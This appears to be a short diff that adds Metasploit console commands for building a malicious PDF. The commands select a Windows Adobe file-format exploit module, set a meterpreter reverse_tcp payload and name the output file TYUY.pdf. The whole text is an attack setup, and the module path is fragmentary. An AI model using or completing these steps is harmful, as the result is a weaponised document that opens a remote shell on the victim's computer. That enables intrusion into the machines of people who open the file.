@@ -1,0 +1,6 @@
+msfconsole
+ use exploit/windows/fileformat/adobe
+ use 14
+set PAYLOAD windows/meterpreter/reverse_tcp
+show options
+set FILENAME TYUY.pdf 
